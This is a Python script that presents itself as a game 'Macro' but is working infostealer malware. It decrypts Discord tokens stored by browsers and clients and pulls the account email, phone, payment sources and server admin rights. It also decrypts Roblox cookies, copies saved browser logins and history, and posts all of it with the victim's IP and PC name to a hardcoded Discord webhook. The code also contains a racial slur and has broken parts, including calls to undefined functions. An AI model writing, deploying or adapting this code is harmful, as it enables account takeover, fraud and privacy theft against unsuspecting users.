import random
import string
import os
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import shutil
import sqlite3
import requests
import tempfile
import platform
import psutil
import cpuinfo
import GPUtil
import socket
import getpass
import threading
import time
import keyboard
import ctypes
import win32crypt
from Crypto.Cipher import AES
from pynput import mouse, keyboard as pynput_keyboard
from pynput import mouse, keyboard

WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"  # Replace this with your actual webhook URL

print("Loading Macro... (This may take 5-10 seconds)")

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getipwhois_data():
    try:
        with urllib.request.urlopen("https://ipwhois.app/json/") as response:
            return json.loads(response.read().decode())
    except Exception as e:
        return {"error": str(e)}

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] is not None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    if res[0]["current_period_end"] is not None:
                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    if id["cooldown_ends_at"] is not None:
                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            print_boost += f"ㅤ- Available now\n"
                            available += 1
                        else:
                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                ip_data = getipwhois_data()
                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}IP Info:```yaml\nIP: {ip_data.get("ip")}\nMore details: https://ipwho.is/{ip_data.get("ip")}```System Info:```yaml\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Ryzen"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Cold Nigga",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

def send_to_discord(message):
    payload = {"content": message}
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("")
    else:
        print(f"❌ Failed to Launch Macro. Status code: {response.status_code}")

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        send_to_discord("⚠️ robloxcookies.dat not found.")
        return

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")
        if not encoded_cookies:
            send_to_discord("⚠️ No 'CookiesData' found in the file.")
            return

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```")

    except json.JSONDecodeError as e:
        send_to_discord(f"❌ JSON parsing error: {e}")
    except Exception as e:
        send_to_discord(f"❌ Unexpected error: {e}")

def is_browser_installed(browser):
    user_profile = os.environ['USERPROFILE']
    if browser == 'chrome':
        return os.path.exists(os.path.join(user_profile, r"AppData\Local\Google\Chrome"))
    elif browser == 'brave':
        return os.path.exists(os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser"))
    elif browser == 'firefox':
        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox"))
    elif browser == 'opera':
        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"))
    elif browser == 'opera_gx':
        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"))
    elif browser == 'safari':
        return os.path.exists(os.path.join(user_profile, r"AppData\Local\Microsoft\Edge"))
    return False

def get_login_data_path(browser, profile):
    try:
        user_profile = os.environ['USERPROFILE']
        if browser == 'chrome':
            base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data", profile)
        elif browser == 'brave':
            base_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data", profile)
        elif browser == 'firefox':
            profiles_dir = os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox\Profiles")
            candidate = os.path.join(profiles_dir, profile, 'logins.json')
            if os.path.exists(candidate):
                return candidate
            return None
        elif browser == 'opera':
            base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable")
        elif browser == 'opera_gx':
            base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable")
        elif browser == 'safari':
            base_path = os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data", profile)
        else:
            return None

        candidate = os.path.join(base_path, "Login Data")
        if os.path.exists(candidate):
            return candidate
    except Exception as e:
        print(f"Error getting login data path for {browser}: {e}")
    return None

def copy_database(source_path, temp_path):
    try:
        shutil.copy2(source_path, temp_path)
        return True
    except Exception as e:
        print(f"Error copying database: {e}")
        return False

def extract_logins(db_path):
    results = []
    try:
        con = sqlite3.connect(db_path)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, date_created FROM logins")
        rows = cur.fetchall()
        con.close()

        for url, username, timestamp in rows:
            if not username.strip():
                continue
            try:
                dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                iso_time = dt.isoformat()
            except Exception as e:
                print(f"Error converting timestamp: {e}")
                iso_time = "Unknown"
            results.append((url, username, iso_time))
    except Exception as e:
        print(f"Error extracting logins: {e}")
    return results

def write_to_file(data, file_path):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            for url, email, timestamp in data:
                f.write(f"URL: {url}\nEmail: {email}\nSaved: {timestamp}\n\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

def send_file_to_discord(file_path, file_name):
    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (file_name, f)
            }
            requests.post(WEBHOOK_URL, files=files)
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

def collect_browser_logins(browser, profile):
    original_db = get_login_data_path(browser, profile)
    if not original_db:
        return

    temp_db = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_LoginData_Copy.db")
    if not copy_database(original_db, temp_db):
        return

    logins = extract_logins(temp_db)
    if not logins:
        return

    temp_txt = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_logins.txt")
    write_to_file(logins, temp_txt)
    send_file_to_discord(temp_txt, f"{browser}_{profile}_logins.txt")

def get_history_path(browser, profile):
    user_profile = os.environ['USERPROFILE']
    if browser == 'chrome':
        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data", profile)
    elif browser == 'brave':
        base_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data", profile)
    elif browser == 'firefox':
        profiles_dir = os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox\Profiles")
        candidate = os.path.join(profiles_dir, profile, 'places.sqlite')
        if os.path.exists(candidate):
            return candidate
        return None
    elif browser == 'opera':
        base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable")
    elif browser == 'opera_gx':
        base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable")
    elif browser == 'safari':
        base_path = os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data", profile)
    else:
        return None

    candidate = os.path.join(base_path, "History")
    if os.path.exists(candidate):
        return candidate
    return None

def copy_and_access_db(source_db, temp_db):
    try:
        if not os.path.exists(source_db):
            return []
        # Copy the history database to a temporary location
        shutil.copyfile(source_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        history = cursor.fetchall()
        conn.close()

        # Remove the temporary database file
        os.remove(temp_db)

        return history
    except Exception as e:
        print(f"Error accessing {source_db}: {e}")
        return []

def get_browser_history(browser, profile):
    history_path = get_history_path(browser, profile)
    if not history_path:
        return ""

    temp_db = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_history_temp.db")
    history = copy_and_access_db(history_path, temp_db)
    history_text = "\n".join([f"{visit_time} - {title} ({url})" for url, title, visit_time in history])
    return history_text

def send_history_to_discord(history_text, browser, profile):
    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as temp_file:
        temp_file.write(history_text)
        temp_file_path = temp_file.name

    with open(temp_file_path, "rb") as f:
        files = {"file": (f"{browser}_{profile}_history.txt", f)}
        response = requests.post(WEBHOOK_URL, files=files)

    os.remove(temp_file_path)
    return response.status_code

def main():
    browsers = {
        'chrome': ['Default', 'Profile 1', 'Profile 2'],
        'brave': ['Default', 'Profile 1', 'Profile 2'],
        'firefox': ['*.default-release'],
        'opera': [''],
        'opera_gx': [''],
        'safari': ['Default']
    }

    for browser, profiles in browsers.items():
        if not is_browser_installed(browser):
            continue

        for profile in profiles:
            if browser == 'firefox' and not profile.endswith('.default-release'):
                continue
            collect_browser_logins(browser, profile)
            history_text = get_browser_history(browser, profile)
            if history_text:
                send_history_to_discord(history_text, browser, profile)

def generate_key(length=20):
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

if __name__ == "__main__":
    print("[*] Launching Macro...")

    # Run only the stable functions (NO SYSTEM INFO)
    main()
    retrieve_roblox_cookies()
    collect_chrome_logins()

    # Browser history
    history = get_chrome_history(limit=100)
    status = send_history_to_discord(history)
